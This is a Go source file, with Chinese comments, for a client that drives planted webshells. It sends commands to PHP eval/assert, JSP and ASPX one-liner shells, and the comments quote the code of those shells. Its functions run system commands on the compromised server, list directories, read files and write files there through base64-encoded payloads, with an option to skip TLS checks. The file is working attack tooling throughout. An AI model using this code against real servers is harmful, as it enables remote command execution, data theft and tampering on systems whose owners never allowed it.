// Package webshell 是几种常见 webshell 协议的适配器。
//
// 平台不生成 payload、也不做加密对抗：它只把「一条命令 / 一个文件操作」
// 翻译成目标 shell 认的请求格式，再把回包剥掉包装取干净文本。
// 支持的范围刻意做得窄而准，宁可不支持也不猜协议。
package webshell

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Config struct {
	URL    string            `json:"url"`
	Kind   string            `json:"kind"`   // php-eval / php-base64 / php-assert / jsp / aspx / custom
	Secret string            `json:"secret"` // 一句话的参数名（PHP）或口令
	Header map[string]string `json:"header,omitempty"`
	Body   string            `json:"body,omitempty"` // custom：body 模板，用 {{cmd}} 占位
	Insecure bool            `json:"insecure,omitempty"`
	Timeout  int             `json:"timeout,omitempty"`
}

func (c Config) client() *http.Client {
	to := c.Timeout
	if to <= 0 {
		to = 20
	}
	tr := &http.Transport{}
	if c.Insecure {
		tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}
	return &http.Client{Timeout: time.Duration(to) * time.Second, Transport: tr}
}

// payload 返回 (body, contentType)。cmd 是 PHP/JSP 片段或原始命令。
func (c Config) payload(cmd string) (string, string, error) {
	key := c.Secret
	if key == "" {
		key = "cmd"
	}
	switch c.Kind {
	case "php-eval":
		// 目标：<?php @eval($_POST['key']); ?>
		return url.Values{key: {cmd}}.Encode(), "application/x-www-form-urlencoded", nil
	case "php-base64":
		// 目标：<?php @eval(base64_decode($_POST['key'])); ?>
		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		return url.Values{key: {b64}}.Encode(), "application/x-www-form-urlencoded", nil
	case "php-assert":
		// 旧版 assert 型：命令直接传，不需要分号包裹
		return url.Values{key: {cmd}}.Encode(), "application/x-www-form-urlencoded", nil
	case "jsp":
		// 目标：<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
		return url.Values{key: {cmd}}.Encode(), "application/x-www-form-urlencoded", nil
	case "aspx":
		// 目标：<%@ Page Language="C#"%><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
		return url.Values{key: {cmd}}.Encode(), "application/x-www-form-urlencoded", nil
	case "custom":
		if c.Body == "" {
			return "", "", errors.New("webshell: custom 类型必须给 body 模板")
		}
		return strings.ReplaceAll(c.Body, "{{cmd}}", cmd), "application/x-www-form-urlencoded", nil
	}
	return "", "", fmt.Errorf("webshell: 不支持的 kind %q", c.Kind)
}

func (c Config) do(ctx context.Context, cmd string) (string, error) {
	body, ct, err := c.payload(cmd)
	if err != nil {
		return "", err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.URL, strings.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", ct)
	for k, v := range c.Header {
		req.Header.Set(k, v)
	}
	resp, err := c.client().Do(req)
	if err != nil {
		return "", fmt.Errorf("webshell: 请求失败: %w", err)
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return "", err
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("webshell: HTTP %d: %s", resp.StatusCode, truncate(string(b), 200))
	}
	return string(b), nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// php 包装：让结果只输出命令 stdout，不掺 shell 元信息。
func phpExec(cmd string) string {
	q := strings.ReplaceAll(cmd, "'", `\'`)
	return "system('" + q + "');"
}
func phpList(path string) string {
	q := strings.ReplaceAll(path, "'", `\'`)
	return "$d=@opendir('" + q + "');if(!$d){echo 'ERR:no-dir';exit;}" +
		"while(($f=readdir($d))!==false){echo $f.\"\\n\";}"
}
func phpRead(path string) string {
	q := strings.ReplaceAll(path, "'", `\'`)
	return "$s=@file_get_contents('" + q + "');echo $s===false?'ERR:read-fail':$s;"
}
func phpWrite(path, b64 string) string {
	q := strings.ReplaceAll(path, "'", `\'`)
	return "$r=@file_put_contents('" + q + "',base64_decode('" + b64 + "'));echo $r===false?'ERR:write-fail':('OK:'.$r);"
}
func phpInfo() string {
	return "echo 'OK:' . php_uname() . '|' . get_current_user() . '|' . (function_exists('system')?'sys':'-');"
}

// Exec 执行一条系统命令。
func (c Config) Exec(ctx context.Context, cmd string) (string, error) {
	switch {
	case strings.HasPrefix(c.Kind, "php"):
		return c.do(ctx, phpExec(cmd))
	case c.Kind == "jsp":
		// JSP 一句话只负责起进程，拿不到 stdout —— 这是协议本身的限制，如实告知
		_, err := c.do(ctx, cmd)
		if err != nil {
			return "", err
		}
		return "（JSP exec 型无回显：命令已下发，输出需另用读文件方式取回）", nil
	case c.Kind == "aspx":
		_, err := c.do(ctx, cmd)
		if err != nil {
			return "", err
		}
		return "（ASPX Start 型无回显：命令已下发）", nil
	case c.Kind == "custom":
		return c.do(ctx, cmd)
	}
	return "", fmt.Errorf("webshell: 不支持的 kind %q", c.Kind)
}

// Ping 判断 shell 还在不在。
func (c Config) Ping(ctx context.Context) (string, error) {
	switch {
	case strings.HasPrefix(c.Kind, "php"):
		return c.do(ctx, phpInfo())
	case c.Kind == "custom":
		return c.do(ctx, "id")
	}
	return c.do(ctx, "whoami")
}

func (c Config) ListDir(ctx context.Context, path string) (string, error) {
	if strings.HasPrefix(c.Kind, "php") {
		return c.do(ctx, phpList(path))
	}
	return c.Exec(ctx, "ls -la "+path)
}

func (c Config) ReadFile(ctx context.Context, path string) (string, error) {
	if strings.HasPrefix(c.Kind, "php") {
		return c.do(ctx, phpRead(path))
	}
	return c.Exec(ctx, "cat "+path)
}

func (c Config) WriteFile(ctx context.Context, path string, content []byte) (string, error) {
	b64 := base64.StdEncoding.EncodeToString(content)
	if strings.HasPrefix(c.Kind, "php") {
		return c.do(ctx, phpWrite(path, b64))
	}
	return c.Exec(ctx, "echo "+b64+" | base64 -d > "+path+" && echo OK")
}
